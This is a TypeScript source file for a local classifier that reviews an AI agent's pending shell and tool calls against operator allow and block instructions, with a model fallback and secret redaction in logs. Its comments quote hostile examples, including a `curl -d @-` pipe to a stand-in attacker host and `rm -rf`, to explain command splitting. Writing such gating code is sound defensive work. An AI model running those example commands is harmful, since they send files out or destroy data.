import { randomUUID } from "node:crypto";
import type { PromptExecutor } from "../../../packages/chat-inference/base.js";
import { conversationIdKey, requestIdKey } from "../../../packages/chat-inference-proto/client.js";
import { createContext } from "../../../packages/context/core.js";
import type { Context } from "../../../packages/context/core.js";
import { smartModeClassifierModeKey } from "../../../packages/agent/utils/smart-mode-classifier-measurement.js";
import { redactSandAutoReviewInlineSecrets } from "../../runner/sand-auto-review-summaries.js";
import { isSandBoxSettingEnabled, SAND_TOOL_TRACE_SETTING } from "../../sand-box-setting.js";
import {
  SmartModeClassifierArgs,
  SmartModeClassifierDecision,
  SmartModeClassifierError,
  SmartModeClassifierResult,
  SmartModeClassifierSuccess,
} from "../../../packages/proto/generated/agent/v1/smart_mode_classifier_exec_pb.js";

/**
 * REVIEW-1. The only classifier this build had was `ClassifySandAutoReview`, a Cursor backend RPC.
 * On a box with no Cursor login every call fails, and a classifier that always fails means every
 * reviewed tool call is either waved through (shadow) or refused outright (enforce). Neither is
 * the product: the product evaluates the pending call against the operator's allow and block
 * instructions BEFORE it runs, and raises an approval card when it decides to block.
 *
 * So this is a local classifier with two layers:
 *
 *   1. A deterministic evaluator over the instructions. Literal, not semantic: an instruction is
 *      reduced to its operative phrase and that phrase must appear in the pending action. Block
 *      instructions are checked first and win outright; an allow instruction only matters when no
 *      block matched, and it is read far more strictly than a block -- see `allowPhraseRegExp`.
 *      This layer needs no model, costs nothing and cannot time out, which is what makes it the
 *      thing a gate can prove.
 *   2. A model layer behind it, on the routed inference session the rest of the host uses out of
 *      turn (the memory synthesiser is the same shape). It is consulted only when instructions
 *      exist, none of them matched literally, AND the surface is in enforce mode -- so the common
 *      cases never pay for a model call, and a shadow review, whose verdict is discarded by every
 *      caller, never pays for one at all.
 *
 * With no instructions at all there is nothing to enforce and the answer is ALLOW. With no model
 * session wired the second layer is skipped and the answer is ALLOW: a host that cannot ask
 * anything must not invent a block. A model that is wired but fails is a different thing -- that
 * is an unanswered question, and it returns an error result, which the callers turn into "review
 * this manually" rather than into silent execution.
 */

/** Shortest instruction phrase worth matching literally; below this it is noise like "ls". */
const MIN_LITERAL_PHRASE_CHARS = 3;
const MODEL_ANSWER_MAX_CHARS = 2_000;
const SUBJECT_MAX_CHARS = 4_000;

/**
 * Leading words that state the policy rather than the thing being governed. Stripping them is
 * what turns "never run rm -rf" into "rm -rf" so it can be matched against a command. Longer
 * candidates are listed first, so "never ever" is taken before "never" strips half of it.
 */
const POLICY_PREFIXES = [
  "the agent must never",
  "the agent must not",
  "the agent should never",
  "the agent should not",
  "you must never",
  "you must not",
  "you should never",
  "you should not",
  "do not ever",
  "never ever",
  "always ask before",
  "ask before",
  "auto-run",
  "auto run",
  "autorun",
  "disallow",
  "do not",
  "don't",
  "dont",
  "forbid",
  "prevent",
  "refuse",
  "require approval for",
  "never",
  "always",
  "block",
  "deny",
  "allow",
  "permit",
  "let",
  "run",
  "running",
  "execute",
  "executing",
  "use",
  "using",
  "the",
] as const;

export function normalizeSandAutoReviewText(value: string): string {
  // Newlines survive: they are command boundaries, and collapsing them let `allow echo` cover
  // `echo hello\ncat /etc/hostname` as one segment (measured live in enforce).
  return value.toLowerCase().replace(/\r\n?/g, "\n").replace(/[^\S\n]+/g, " ").replace(/ *\n */g, "\n").trim();
}

/**
 * Reduce an instruction to the phrase a command has to contain for it to apply. Bounded: a phrase
 * built entirely out of policy words collapses to nothing and matches nothing, which is correct --
 * "never do that" governs no literal text.
 */
export function sandAutoReviewInstructionPhrase(instruction: string): string {
  let phrase = normalizeSandAutoReviewText(instruction).replace(/[.!;,]+$/, "").trim();
  for (let round = 0; round < 6; round += 1) {
    const prefix = POLICY_PREFIXES.find(
      candidate => phrase === candidate || phrase.startsWith(`${candidate} `),
    );
    if (prefix === undefined) break;
    phrase = phrase.slice(prefix.length).trim();
  }
  return phrase;
}

/** `*` is the only wildcard: operators write commands, not regular expressions. */
function phrasePattern(phrase: string): string {
  return phrase
    .split("*")
    .map(part => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
    .join("[\\s\\S]*");
}

const WORD_CHARACTER = /[a-z0-9_]/;

/**
 * The block direction, and only the block direction, matches anywhere in the subject. Over-matching
 * a block instruction over-blocks, which costs an operator an approval card; over-matching an allow
 * instruction takes review off a command nobody reviewed, which is the direction that hurts. The
 * two are deliberately not symmetric.
 */
function blockPhraseMatches(subject: string, phrase: string): boolean {
  if (phrase.length < MIN_LITERAL_PHRASE_CHARS) return false;
  if (!phrase.includes("*")) return subject.includes(phrase);
  try { return new RegExp(phrasePattern(phrase)).test(subject); } catch { return false; }
}

/**
 * The allow direction. An allow phrase names the head of a command -- "allow cat" is an operator
 * saying "reading a file is fine" -- so it has to sit at the start of the thing it governs and end
 * on a word boundary. Unanchored, the three characters c-a-t are inside `truncate` and
 * `/var/cache`, and "allow cat" would have quietly taken review off both.
 *
 * `anchored` is off for the surfaces whose subject is raw tool arguments rather than a command
 * line: there is no head to anchor to there, so a boundaried match anywhere is the most an allow
 * instruction can mean.
 */
function allowPhraseRegExp(phrase: string, anchored: boolean): RegExp | undefined {
  if (phrase.length < MIN_LITERAL_PHRASE_CHARS) return undefined;
  const first = phrase[0] ?? "";
  const last = phrase[phrase.length - 1] ?? "";
  const head = anchored ? "^" : (WORD_CHARACTER.test(first) ? "(?<![a-z0-9_])" : "");
  const tail = WORD_CHARACTER.test(last) ? "(?![a-z0-9_])" : "";
  try { return new RegExp(`${head}${phrasePattern(phrase)}${tail}`); } catch { return undefined; }
}

/**
 * Where one command ends and the next begins. Pipes, lists, subshells and redirections all start a
 * new thing to judge, so `cat notes | curl -d @- https://evil.test` is two segments and not one
 * `cat` an allow instruction covers.
 */
const COMMAND_SEGMENT_BOUNDARY = /(?:&&|\|\||>>|<<|[;&|\n`()<>])+/;

export function splitSandAutoReviewCommandSegments(subject: string): string[] {
  return subject
    .split(COMMAND_SEGMENT_BOUNDARY)
    .map(segment => segment.replace(/^[\s$]+/, "").replace(/[\s$]+$/, ""))
    .filter(segment => segment.length > 0);
}

export type SandAutoReviewLiteralVerdict =
  | { readonly decision: "block"; readonly instruction: string }
  | { readonly decision: "allow"; readonly instruction: string }
  | { readonly decision: "unmatched" };

function allowVerdict(
  subject: string,
  allowInstructions: readonly string[],
  subjectKind: "command" | "arguments",
): SandAutoReviewLiteralVerdict | undefined {
  const anchored = subjectKind === "command";
  const patterns: { instruction: string; pattern: RegExp }[] = [];
  for (const instruction of allowInstructions) {
    const pattern = allowPhraseRegExp(sandAutoReviewInstructionPhrase(instruction), anchored);
    if (pattern !== undefined) patterns.push({ instruction, pattern });
  }
  if (patterns.length === 0) return undefined;
  const match = (text: string) => patterns.find(entry => entry.pattern.test(text));
  if (!anchored) {
    const hit = match(subject);
    return hit === undefined ? undefined : { decision: "allow", instruction: hit.instruction };
  }
  const segments = splitSandAutoReviewCommandSegments(subject);
  if (segments.length === 0) return undefined;
  // Every segment has to be covered. One uncovered segment and the whole command is unmatched, so
  // it falls to the model layer instead of being waved through on the strength of the first word.
  let first: string | undefined;
  for (const segment of segments) {
    const hit = match(segment);
    if (hit === undefined) return undefined;
    first ??= hit.instruction;
  }
  return first === undefined ? undefined : { decision: "allow", instruction: first };
}

/**
 * Block first, and a block is final: an operator who wrote both "allow git" and "never run git
 * push --force" means the second one to win where both apply.
 */
export function evaluateSandAutoReviewInstructions(args: {
  readonly subject: string;
  readonly allowInstructions: readonly string[];
  readonly blockInstructions: readonly string[];
  /** Defaults to "command", the stricter reading of an allow instruction. */
  readonly subjectKind?: "command" | "arguments";
}): SandAutoReviewLiteralVerdict {
  const subject = normalizeSandAutoReviewText(args.subject);
  if (subject.length === 0) return { decision: "unmatched" };
  for (const instruction of args.blockInstructions) {
    if (blockPhraseMatches(subject, sandAutoReviewInstructionPhrase(instruction))) {
      return { decision: "block", instruction };
    }
  }
  return allowVerdict(subject, args.allowInstructions, args.subjectKind ?? "command")
    ?? { decision: "unmatched" };
}

export interface SandAutoReviewTargetFacts {
  readonly action: string;
  readonly subject: string;
  /**
   * What `subject` is made of. "command" is the shell surface's own command field; "arguments" is
   * everything else, whose text is the raw tool arguments -- the keystrokes of a computer-use
   * action, an MCP call's arguments. The two are judged identically and traced differently.
   */
  readonly subjectKind: "command" | "arguments";
  readonly allowInstructions: readonly string[];
  readonly blockInstructions: readonly string[];
}

function stringLeaves(value: unknown, into: string[], depth = 0): void {
  if (depth > 6 || into.length > 64) return;
  if (typeof value === "string") { if (value.trim().length > 0) into.push(value); return; }
  if (Array.isArray(value)) { for (const item of value) stringLeaves(item, into, depth + 1); return; }
  if (typeof value === "object" && value != null) {
    for (const item of Object.values(value as Record<string, unknown>)) {
      stringLeaves(item, into, depth + 1);
    }
  }
}

/**
 * Everything the two layers need is already inside the target the caller built: the shell branch
 * puts the command there, and every surface puts the operator's instructions there under
 * `project_permissions.auto_run` (smart-mode-project-permissions.ts). Reading them back off the
 * target rather than threading a second copy of the settings through means the classifier judges
 * exactly what the tool was about to do.
 */
export function describeSandAutoReviewTarget(
  target: { readonly action?: string; readonly arguments?: { toJson(): unknown } } | undefined,
): SandAutoReviewTargetFacts {
  const action = target?.action ?? "";
  let raw: Record<string, unknown> = {};
  try {
    const json = target?.arguments?.toJson();
    if (typeof json === "object" && json != null && !Array.isArray(json)) {
      raw = json as Record<string, unknown>;
    }
  } catch { /* a target with unreadable arguments still gets judged on its action alone */ }
  const permissions = raw.project_permissions as { auto_run?: Record<string, unknown> } | undefined;
  const autoRun = permissions?.auto_run ?? {};
  const list = (value: unknown): string[] =>
    Array.isArray(value) ? value.filter((item): item is string => typeof item === "string") : [];
  const { project_permissions: _permissions, target_enrichment: _enrichment, ...rest } = raw;
  const command = typeof rest.command === "string" ? rest.command : undefined;
  const leaves: string[] = [];
  if (command === undefined) stringLeaves(rest, leaves);
  const subject = (command ?? leaves.join(" ")).slice(0, SUBJECT_MAX_CHARS);
  return {
    action,
    subject,
    subjectKind: command === undefined ? "arguments" : "command",
    allowInstructions: list(autoRun.allow_instructions),
    blockInstructions: list(autoRun.block_instructions),
  };
}

const success = (
  decision: SmartModeClassifierDecision,
  blockReason?: string,
): SmartModeClassifierResult => new SmartModeClassifierResult({
  result: {
    case: "success",
    value: new SmartModeClassifierSuccess({
      decision,
      ...(blockReason === undefined ? {} : { blockReason }),
    }),
  },
});

const failure = (error: string): SmartModeClassifierResult => new SmartModeClassifierResult({
  result: { case: "error", value: new SmartModeClassifierError({ error }) },
});

export function formatSandAutoReviewLiteralBlockReason(instruction: string): string {
  return `This action matches your Auto-review block instruction: ${instruction.trim()}`;
}

export interface SandAutoReviewModelSession {
  getExecutor(state?: unknown): unknown;
}

const CLASSIFIER_SYSTEM_PROMPT = [
  "You are an Auto-review classifier. You are shown one action an AI agent is about to take on the",
  "user's machine, and the user's own allow and block instructions.",
  "Decide whether the action is permitted by those instructions.",
  "Judge only against the instructions given. Do not invent policy of your own.",
  "Answer with one JSON object and nothing else:",
  '{"decision":"allow"} or {"decision":"block","reason":"<one short sentence naming the instruction it violates>"}',
].join(" ");

function buildClassifierPrompt(facts: SandAutoReviewTargetFacts): string {
  return [
    `Action: ${facts.action || "unknown"}`,
    `Details: ${facts.subject || "(none)"}`,
    `Block instructions:${facts.blockInstructions.length === 0 ? " (none)" : ""}`,
    ...facts.blockInstructions.map(instruction => `- ${instruction}`),
    `Allow instructions:${facts.allowInstructions.length === 0 ? " (none)" : ""}`,
    ...facts.allowInstructions.map(instruction => `- ${instruction}`),
  ].join("\n");
}

/** The model is asked for one JSON object; a fenced or chatty answer still parses. */
export function parseSandAutoReviewModelAnswer(
  answer: string,
): { readonly decision: "allow" | "block"; readonly reason?: string } | undefined {
  const open = answer.indexOf("{");
  const close = answer.lastIndexOf("}");
  if (open < 0 || close <= open) return undefined;
  let parsed: unknown;
  try { parsed = JSON.parse(answer.slice(open, close + 1)); } catch { return undefined; }
  if (typeof parsed !== "object" || parsed == null) return undefined;
  const record = parsed as Record<string, unknown>;
  const decision = typeof record.decision === "string" ? record.decision.toLowerCase().trim() : "";
  if (decision !== "allow" && decision !== "block") return undefined;
  const reason = typeof record.reason === "string" ? record.reason.trim() : "";
  return decision === "block" && reason.length > 0 ? { decision, reason } : { decision };
}

async function askModel(
  session: SandAutoReviewModelSession,
  facts: SandAutoReviewTargetFacts,
  signal: AbortSignal | undefined,
): Promise<string> {
  const [context, cancel] = createContext()
    .with(conversationIdKey, randomUUID())
    .with(requestIdKey, randomUUID())
    .withCancel();
  const abort = () => cancel({ intentional: false, reason: "auto-review classifier cancelled" });
  if (signal?.aborted === true) abort();
  else signal?.addEventListener("abort", abort, { once: true });
  try {
    const executor = session.getExecutor() as PromptExecutor<Record<string, unknown>>;
    executor.appendMessages([
      { role: "system", content: CLASSIFIER_SYSTEM_PROMPT },
      { role: "user", content: buildClassifierPrompt(facts) },
    ]);
    const stream = executor.stream(context, undefined, undefined, {}) as {
      fullStream: AsyncIterable<Record<string, unknown>>;
    };
    let text = "";
    for await (const part of stream.fullStream) {
      if (part.type === "text-delta") text += String(part.textDelta ?? "");
      else if (part.type === "error") {
        throw part.error instanceof Error ? part.error : new Error(String(part.error));
      }
      if (text.length > MODEL_ANSWER_MAX_CHARS) break;
    }
    return text;
  } finally {
    signal?.removeEventListener("abort", abort);
  }
}

/** How much of a command survives into a trace line. The decision needs the shape, not the tail. */
const TRACE_SUBJECT_MAX_CHARS = 200;

/**
 * A long unbroken run of credential-shaped characters, masked on top of the keyed redaction: a
 * command can carry a bare token with no `secret=` in front of it to key off. Hyphens, dots and
 * slashes are out of the class deliberately, so a path or file name is not mistaken for a key;
 * a base64 token with slashes in it is masked run by run instead of whole.
 */
const TRACE_OPAQUE_RUN = /[A-Za-z0-9_+=]{24,}/g;

/**
 * The same idea for a credential that carries its own hyphens -- `xoxb-<digits>-<digits>-<secret>`
 * and the AWS-key shapes -- which the run above only masks the longest segment of. Hyphenated
 * words are mostly paths and identifiers, so a token is taken as one only when it is long, mixes
 * letters with digits, and has a segment longer than ordinary words are. `/` is out of the class
 * for the same reason `-` and `.` are out of the run above: a path is the part of a command an
 * operator reads it by. `probe-review-5bzlu5-enforce` and `2026-09-04-nightly-backup` survive
 * this, which is what the test pins.
 */
const TRACE_HYPHENATED_RUN = /[A-Za-z0-9_+=…]+(?:-[A-Za-z0-9_+=…]+){2,}/g;
const TRACE_HYPHENATED_MIN_CHARS = 24;
const TRACE_HYPHENATED_MIN_SEGMENT_CHARS = 8;

function looksLikeHyphenatedSecret(run: string): boolean {
  if (run.length < TRACE_HYPHENATED_MIN_CHARS) return false;
  if (!/[0-9]/.test(run) || !/[A-Za-z]/.test(run)) return false;
  return run.split("-").some(segment => segment.length >= TRACE_HYPHENATED_MIN_SEGMENT_CHARS);
}

/**
 * What a trace line is allowed to say about the thing being judged.
 *
 * The classifier sees raw tool arguments, and the host log it would write them to is
 * world-readable inside the box while agent shells run as an unprivileged user -- so a line here
 * is a line every agent on the box can read. A shell command is the subject an operator has to be
 * able to recognise, so it goes in redacted the way the approval summaries redact one. Every other
 * surface's text is keystrokes and API arguments, which no reader of a log needs: its size is
 * enough to tell a big paste from an empty field, and its content stays out.
 */
export function describeSandAutoReviewTraceSubject(
  facts: SandAutoReviewTargetFacts,
): Record<string, unknown> {
  if (facts.subjectKind !== "command") return { subjectChars: facts.subject.length };
  const redacted = redactSandAutoReviewInlineSecrets(facts.subject)
    .replace(TRACE_OPAQUE_RUN, "…")
    .replace(TRACE_HYPHENATED_RUN, run => looksLikeHyphenatedSecret(run) ? "…" : run);
  return { subject: redacted.slice(0, TRACE_SUBJECT_MAX_CHARS) };
}

/**
 * The surface's own mode for this call, put on the context by
 * `executeSmartModeClassifierWithMeasurement` before it hands the args to an executor. Re-exported
 * because it is now part of what a classifier is expected to read, not only telemetry.
 */
export { smartModeClassifierModeKey as sandAutoReviewClassifierModeKey };

/** Absent means the caller did not say, and the expensive, careful reading is the safe default. */
export function sandAutoReviewClassifierMode(ctx: Context): string {
  try { return ctx.get(smartModeClassifierModeKey) ?? "enforce"; } catch { return "enforce"; }
}

export interface SandLocalAutoReviewClassifierOptions {
  /** Absent means deterministic-only: the second layer is skipped rather than guessed at. */
  readonly createModelSession?: () => SandAutoReviewModelSession | undefined;
  readonly report?: (event: Record<string, unknown>) => void;
}

export function createSandLocalAutoReviewClassifierExecutor(
  options: SandLocalAutoReviewClassifierOptions = {},
) {
  // Off unless the operator asked for tracing, the same switch that gates [sand][toolset] and the
  // prompt section report. A classifier that runs on every reviewed tool call, in shadow as well
  // as enforce, must not be a subsystem that logs by default.
  const report = options.report ?? ((event: Record<string, unknown>) => {
    if (!isSandBoxSettingEnabled(SAND_TOOL_TRACE_SETTING)) return;
    console.log(`[sand][auto-review] ${JSON.stringify(event)}`);
  });
  return {
    async execute(ctx: Context, args: SmartModeClassifierArgs): Promise<SmartModeClassifierResult> {
      const facts = describeSandAutoReviewTarget(args.target);
      const hasPolicy = facts.allowInstructions.length > 0 || facts.blockInstructions.length > 0;
      const say = (event: Record<string, unknown>) => {
        report({ action: facts.action, ...describeSandAutoReviewTraceSubject(facts), ...event });
      };
      if (!hasPolicy) {
        say({ layer: "none", decision: "allow", why: "no allow or block instructions are set" });
        return success(SmartModeClassifierDecision.ALLOW);
      }
      const literal = evaluateSandAutoReviewInstructions({
        subject: facts.subject,
        subjectKind: facts.subjectKind,
        allowInstructions: facts.allowInstructions,
        blockInstructions: facts.blockInstructions,
      });
      if (literal.decision === "block") {
        say({ layer: "literal", decision: "block", instruction: literal.instruction });
        return success(
          SmartModeClassifierDecision.BLOCK,
          formatSandAutoReviewLiteralBlockReason(literal.instruction),
        );
      }
      if (literal.decision === "allow") {
        say({ layer: "literal", decision: "allow", instruction: literal.instruction });
        return success(SmartModeClassifierDecision.ALLOW);
      }
      // Shadow is a mode whose verdict is discarded: every surface either drops the classifier
      // promise on the floor (create-shell-tool.ts, sand-browser-auto-review.ts) or ignores what
      // comes back, because no approval card can be raised. Paying a live inference call, on the
      // routed provider, for an answer nobody can act on is a bill with nothing behind it -- and
      // shadow is the state a box is left in, so this is the default path, not an edge.
      const mode = sandAutoReviewClassifierMode(ctx);
      if (mode !== "enforce") {
        say({ layer: "literal", decision: "allow", mode, why: "no instruction matched, and a shadow verdict cannot raise a card" });
        return success(SmartModeClassifierDecision.ALLOW);
      }
      let session;
      try { session = options.createModelSession?.(); } catch (error: unknown) {
        // A factory that throws (inference not started, wrong options) must still leave a line, or
        // every unmatched command is refused in enforce with nothing in the log to say why.
        const message = error instanceof Error ? error.message : String(error);
        say({ layer: "model", decision: "error", why: `model session unavailable: ${message.slice(0, 160)}` });
        return failure(`Auto-review classifier has no model session: ${message}`);
      }
      if (session === undefined) {
        say({ layer: "literal", decision: "allow", why: "no instruction matched and no model session is wired" });
        return success(SmartModeClassifierDecision.ALLOW);
      }
      // The layer above this one gives up at SMART_MODE_CLASSIFIER_TIMEOUT_MS and turns a timeout
      // into a refusal, so how long the provider took is the thing an operator needs in the log to
      // know how close a legitimate command is to being refused for being slow.
      const askedAtMs = Date.now();
      let answer: string;
      try {
        answer = await askModel(session, facts, ctx.signal);
      } catch (error: unknown) {
        if (error instanceof Error && error.name === "AbortError") throw error;
        const message = error instanceof Error ? error.message : String(error);
        say({ layer: "model", decision: "error", ms: Date.now() - askedAtMs, why: message.slice(0, 200) });
        return failure(`Auto-review classifier could not reach a model: ${message}`);
      }
      const parsed = parseSandAutoReviewModelAnswer(answer);
      if (parsed === undefined) {
        // The model was shown the action, so its answer can quote it back: redact that too.
        say({ layer: "model", decision: "error", ms: Date.now() - askedAtMs, why: "unparseable answer", answer: redactSandAutoReviewInlineSecrets(answer).slice(0, 200) });
        return failure("Auto-review classifier returned an answer it could not read");
      }
      // The model saw the raw command and may quote it back inside its reason.
      say({ layer: "model", decision: parsed.decision, ms: Date.now() - askedAtMs, ...(parsed.reason === undefined ? {} : { reason: redactSandAutoReviewInlineSecrets(parsed.reason).slice(0, 200) }) });
      return parsed.decision === "block"
        ? success(SmartModeClassifierDecision.BLOCK, parsed.reason ?? "Blocked by Auto-review")
        : success(SmartModeClassifierDecision.ALLOW);
    },
  };
}

export interface SandAutoReviewClassifierRouterOptions extends SandLocalAutoReviewClassifierOptions {
  readonly backend: { execute(ctx: Context, args: SmartModeClassifierArgs): Promise<SmartModeClassifierResult> };
  /** A Cursor access token is what makes the backend RPC answerable at all. */
  readonly hasBackendCredential: () => boolean;
}

/**
 * Which classifier answers is decided per call, not once at bind time: a login can arrive after
 * the runner was bound, and a box that never logs in must still get a real decision.
 */
export function createSandAutoReviewClassifierRouter(options: SandAutoReviewClassifierRouterOptions) {
  const local = createSandLocalAutoReviewClassifierExecutor(options);
  return {
    async execute(ctx: Context, args: SmartModeClassifierArgs): Promise<SmartModeClassifierResult> {
      let credentialed = false;
      try { credentialed = options.hasBackendCredential(); } catch { credentialed = false; }
      return credentialed ? await options.backend.execute(ctx, args) : await local.execute(ctx, args);
    },
  };
}
